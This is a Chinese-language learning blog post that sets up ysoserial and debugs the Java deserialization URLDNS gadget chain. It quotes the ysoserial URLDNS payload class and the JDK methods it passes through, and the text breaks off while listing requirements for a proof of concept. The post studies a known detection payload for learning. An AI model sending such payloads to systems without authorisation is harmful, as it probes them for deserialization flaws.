        <content type="html"><![CDATA[<blockquote><p>前面巴拉巴拉一堆理论，现在来看看操作，还是要调试啊</p></blockquote><h2 id="我勒个前导配置工作啊"><a href="#我勒个前导配置工作啊" class="headerlink" title="我勒个前导配置工作啊"></a>我勒个前导配置工作啊</h2><h3 id="总结一下flow"><a href="#总结一下flow" class="headerlink" title="总结一下flow"></a>总结一下flow</h3><blockquote><p>环境配置<br>jdk1.7u21或者1.8都可以</p></blockquote><ol><li>git clone ysoserial源码</li><li>library导入jar包(不使用maven解决)</li><li>maven文件找到mainClass，进入</li><li>成功运行，配置默认debug参数</li><li>可以带参数进行运行了</li><li>references<ol><li><a href="https://wx.zsxq.com/group/2212251881/topic/244415545824541">p牛知识星球</a></li></ol></li></ol><h3 id="也算学到了经验"><a href="#也算学到了经验" class="headerlink" title="也算学到了经验"></a>也算学到了经验</h3><ol><li>记录一下过程中遇到的东西</li><li>P1: 首先是报错java版本6问题，是因为版本设置不当，在project structure中修改一下就好了</li><li>P2: 下载依赖时报错<img src="/pic/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/%E4%BE%9D%E8%B5%96%E6%8A%A5%E9%94%99.png" alt="error"><ol><li><strong>S1: 尝试配置library</strong>: 手动导入library下载intercepter3.1，发现自带的搜索中没有这个</li><li><strong>S2: 尝试配置仓库</strong>: 访问报错中的网址发现居然是400，即使是换了有intercepter3.1的仓库依然无法下载，但是这是个好思路</li></ol></li></ol><h3 id="感谢jar包救我"><a href="#感谢jar包救我" class="headerlink" title="*感谢jar包救我"></a>*感谢jar包救我</h3><blockquote><p>出师未捷身先死，常使英雄泪满襟。依赖一直有问题，最后搞清楚是库问题后也卡死了，还好有b1nb1n大哥<br>特此感谢耐心教导的b1nb1n大哥</p></blockquote><hr><blockquote><p>总结一下<br>1.其实配置环境时遇到了问题就像是做web题，都要找到方向来解决，还是要好好看报错信息再理解一下<br>2.这里其实还是工具不熟悉导致的，工欲善其事必先利其器啊，不过有提示说在library应该有敏感度了解一下java的，也是有搜“idea libraries配置”过，不过还是急了<br>3.可以横向衍生一下，搜一下”idea调试项目”类似的</p></blockquote><ol><li>b1nb1n哥一操作就好了，tql</li><li>在有源码的情况下，可以直接在library配置出+java这里导入可以运行的jar文件，然后就直接可以运行了 –&gt; 如果没有源码需要<strong>反编译一下</strong>jadx，有需要再来</li></ol><h2 id="URLDNS动手调试"><a href="#URLDNS动手调试" class="headerlink" title="URLDNS动手调试"></a>URLDNS动手调试</h2><h3 id="Gadget-Chains"><a href="#Gadget-Chains" class="headerlink" title="Gadget Chains"></a>Gadget Chains</h3><blockquote><p>参考一下p牛的安全漫谈，p牛这个思路和他说的先看源码调节这点很契合<br>原理参考一下ref</p></blockquote><ol><li><em><strong>目标导向式的调试就ok了这里</strong></em>: 一步一步深入</li><li>第一次调试成功了！！！</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ysoserial URLDNS.java</span></span><br><span class="line">Gadget Chain:</span><br><span class="line">  HashMap.readObject()</span><br><span class="line">    HashMap.putVal()</span><br><span class="line">      HashMap.hash()</span><br><span class="line">        URL.hashCode()</span><br><span class="line">As part of deserialization, HashMap calls hashCode on each key that it</span><br><span class="line">deserializes, so using a Java URL object as a serialized key allows</span><br><span class="line">it to trigger a DNS lookup.</span><br><span class="line"></span><br><span class="line"><span class="comment">// mime</span></span><br><span class="line">Gadget Chain:</span><br><span class="line"> HashMap</span><br><span class="line">  HashMap.readObejct()</span><br><span class="line">   HashMpa.hash()</span><br><span class="line">    URL.hashCode()</span><br><span class="line">     URLStreamHandler.hashCode()</span><br><span class="line">      URLStreamHandler.getHostAddress()</span><br><span class="line">       IntAddress.getByName()   <span class="comment">// trigger the dns query</span></span><br></pre></td></tr></table></figure><h3 id="URLDNS-java"><a href="#URLDNS-java" class="headerlink" title="URLDNS.java"></a>URLDNS.java</h3><ol><li>从ysosrial的URLDNS.java阅读代码和<strong>注释</strong>，可以知道这条链的利用点在于getObject返回的序列化对象(就是payload)，这个类很短，不难读懂<ol><li><strong>Slient..Class详见下面的Q</strong></li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class="line"><span class="meta">@Dependencies()</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        </span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="HashMap-readObject"><a href="#HashMap-readObject" class="headerlink" title="HashMap.readObject()"></a>HashMap.readObject()</h3><ol><li>触发序列化漏洞是readObject方法，那就来看看返回的HashMap对象的readObject方法<ol><li>根据上述payload中的u对象，跳转到<code>Key.readObject()</code></li><li>注意到是<code>URLStreamHandler</code>的子类，此处需要进入到</li><li>我使用的是java1.7u21版本，这里和网上很多文章不一样，最后是<code>putForCreate()</code>，但是进入后也有<code>hash(key)</code></li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line"> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                           loadFactor);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set hashSeed (can only happen after VM boot)</span></span><br><span class="line">    Holder.UNSAFE.putIntVolatile(<span class="built_in">this</span>, Holder.HASHSEED_OFFSET,</span><br><span class="line">            sun.misc.Hashing.randomHashSeed(<span class="built_in">this</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in number of buckets and allocate the bucket array;</span></span><br><span class="line">    s.readInt(); <span class="comment">// ignored</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read number of mappings</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                           mappings);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">initialCapacity</span> <span class="operator">=</span> (<span class="type">int</span>) Math.min(</span><br><span class="line">            <span class="comment">// capacity chosen by number of mappings</span></span><br><span class="line">            <span class="comment">// and desired load (if &gt;= 0.25)</span></span><br><span class="line">            mappings * Math.min(<span class="number">1</span> / loadFactor, <span class="number">4.0f</span>),</span><br><span class="line">            <span class="comment">// we have limits...</span></span><br><span class="line">            HashMap.MAXIMUM_CAPACITY);</span><br><span class="line">    <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// find smallest power of two which holds all mappings</span></span><br><span class="line">    <span class="keyword">while</span> (capacity &lt; initialCapacity) &#123;</span><br><span class="line">        capacity &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    table = <span class="keyword">new</span> <span class="title class_">Entry</span>[capacity];</span><br><span class="line">    threshold = (<span class="type">int</span>) Math.min(capacity * loadFactor, MAXIMUM_CAPACITY + <span class="number">1</span>);</span><br><span class="line">    useAltHashing = sun.misc.VM.isBooted() &amp;&amp;</span><br><span class="line">            (capacity &gt;= Holder.ALTERNATIVE_HASHING_THRESHOLD);</span><br><span class="line"></span><br><span class="line">    init();  <span class="comment">// Give subclass a chance to do its thing.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;mappings; i++) &#123;</span><br><span class="line">        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">        putForCreate(key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="HashMap-hash"><a href="#HashMap-hash" class="headerlink" title="HashMap.hash()"></a>HashMap.hash()</h3><ol><li>根据ysoserial的注释，可以知道这条链的关键在于hashCode被计算(hash()会调用)，所以在<code>hash(key)</code>处进入&#x2F;断点，进入到HashMap.hash()<ol><li>可以内部逻辑不重要，重要的是跳转到了k.hashCode()，由于继承了URLStreamHandler，进入该类的hashCode一看</li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object k)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (useAltHashing) &#123;</span><br><span class="line">        <span class="keyword">if</span> (k <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            <span class="keyword">return</span> sun.misc.Hashing.stringHash32((String) k);</span><br><span class="line">        &#125;</span><br><span class="line">        h = hashSeed;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h ^= k.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This function ensures that hashCodes that differ only by</span></span><br><span class="line">    <span class="comment">// constant multiples at each bit position have a bounded</span></span><br><span class="line">    <span class="comment">// number of collisions (approximately 8 at default load factor).</span></span><br><span class="line">    h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="URL-hashCode"><a href="#URL-hashCode" class="headerlink" title="URL.hashCode()"></a>URL.hashCode()</h3><ol><li>这里的k式URL的u而不是handler，可以观察到<code>hashCode==-1</code>的时候会调用<code>handler.hashCode()</code>，下一步进入</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="URLStreamHandler-hashCode"><a href="#URLStreamHandler-hashCode" class="headerlink" title="URLStreamHandler.hashCode()"></a>URLStreamHandler.hashCode()</h3><ol><li>来到了该类了，重点关注第18到25行，进入里面调用的两个函数<code>getHostAddress()</code>和<code>getHost()</code>，–&gt; 在getHostAddress()时就有dns了</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Provides the default hash calculation. May be overidden by handlers for</span></span><br><span class="line"><span class="comment"> * other protocols that have different requirements for hashCode</span></span><br><span class="line"><span class="comment"> * calculation.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> u a URL object</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> an &lt;tt&gt;int&lt;/tt&gt; suitable for hash table indexing</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the protocol part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> u.getProtocol();</span><br><span class="line">    <span class="keyword">if</span> (protocol != <span class="literal">null</span>)</span><br><span class="line">        h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line">    <span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">        h += addr.hashCode();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">        <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">            h += host.toLowerCase().hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the file part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> u.getFile();</span><br><span class="line">    <span class="keyword">if</span> (file != <span class="literal">null</span>)</span><br><span class="line">        h += file.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the port part.</span></span><br><span class="line">    <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</span><br><span class="line">        h += getDefaultPort();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        h += u.getPort();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the ref part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">ref</span> <span class="operator">=</span> u.getRef();</span><br><span class="line">    <span class="keyword">if</span> (ref != <span class="literal">null</span>)</span><br><span class="line">        h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="URLStreamHandler-getHostAddress"><a href="#URLStreamHandler-getHostAddress" class="headerlink" title="URLStreamHandler.getHostAddress()"></a>URLStreamHandler.getHostAddress()</h3><ol><li>进入到该函数，有<code>InetAddress.getByName(host)</code>，触发了dns查询了</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (u.hostAddress != <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> u.hostAddress;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">    <span class="keyword">if</span> (host == <span class="literal">null</span> || host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            u.hostAddress = InetAddress.getByName(host);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException ex) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> u.hostAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Dst-InetAddress-getByName-host"><a href="#Dst-InetAddress-getByName-host" class="headerlink" title="Dst: InetAddress.getByName(host)"></a>Dst: InetAddress.getByName(host)</h3><ol><li>结束了，可以在往深处看，也可以不了</li></ol><h2 id="URLDNS深入理解"><a href="#URLDNS深入理解" class="headerlink" title="URLDNS深入理解"></a>URLDNS深入理解</h2><h3 id="Q-为什么需要SilentURLStreamHandler类"><a href="#Q-为什么需要SilentURLStreamHandler类" class="headerlink" title="Q: 为什么需要SilentURLStreamHandler类"></a>Q: 为什么需要SilentURLStreamHandler类</h3><ol><li>这里其实不是必须的，只是在这里是ysoserial一个工具，为保证<strong>在利用时put不会产生dns解析的方法</strong></li><li><em><strong>这里又有一个大问题: <code>SilentURLStreamHandler</code>已经是URL对象的一部分了不会反序列化失败吗？因为目标主机中不会有<code>SilentURLStreamHandler</code></strong></em><ol><li>答案其实是在注释里，<strong>这种项目代码会有注释要利用好</strong></li><li>序列化：<ol><li>在序列化过程中，URL 对象的 handler 字段（即 SilentURLStreamHandler 实例）<strong>是 transient 的</strong>，这意味着它不会被序列化到输出流中。</li><li>因此，序列化后的字节流中不会包含 SilentURLStreamHandler 的实例。</li></ol></li><li>反序列化：<ol><li>在反序列化过程中，URL 对象会被重建，但 handler 字段会保持为 null，因为它是 transient 的。</li><li>这意味着在反序列化后，URL 对象将使用默认的 URLStreamHandler。</li></ol></li></ol></li></ol><h3 id="Q-为什么需要反射设置hashCode-1"><a href="#Q-为什么需要反射设置hashCode-1" class="headerlink" title="Q: 为什么需要反射设置hashCode&#x3D;-1"></a>Q: 为什么需要反射设置hashCode&#x3D;-1</h3><ol><li><p>一开始是由于<code>HashMap.readObject</code>开始的，所以先要将url对象放到HashMap对象中</p></li><li><p>注意到在<code>HashMap.put()</code>方法也会对<code>int hash = hash(key)</code>，所以这里其实就会进行一次dns查询</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(hash, table.length);</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">        Object k;</span><br><span class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">            <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">            e.value = value;</span><br><span class="line">            e.recordAccess(<span class="built_in">this</span>);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modCount++;</span><br><span class="line">    addEntry(hash, key, value, i);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>这里的hashCode()进入后会发现，hashCode已经被设置，在反序列化时来到这里是没有办法调用<code>handler.hashCode()</code>的了</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>解决办法一</strong>: put之后设置hashCode为-1，可以使用反射来实现</p></li></ol><h3 id="URLDNS-poc"><a href="#URLDNS-poc" class="headerlink" title="URLDNS poc"></a>URLDNS poc</h3><blockquote><p>还是得自己写个poc出来，会看调用链不代表会利用</p></blockquote><ol><li>顺便讲讲<em><strong>作用</strong></em><ol><li>因为其参数不是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。</li><li>使⽤Java内置的类构造，对第三⽅库没有依赖</li><li>在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞，<strong>常用于漏洞探测带外这样</strong></li></ol></li><li>poc写要求<ol><li>要求1: 这里使用的URL在hash的情况下调用dns，需要将URL的hashCode设置为-1 –&gt; <strong>使得在hashMap中的u的hashCode&#x3D;-1</strong></li><li>要求2: 这里的handler需要调用到URLStreamHandler的hash()方法，设置的防止初始化时发送dns对这里没有关系</li><li><strong>在本地调用的特殊</strong><ol><li>法一：由于进行了 DNS 解析，本地存在了解析记录，那么第二次解析就不会去请求 DNS 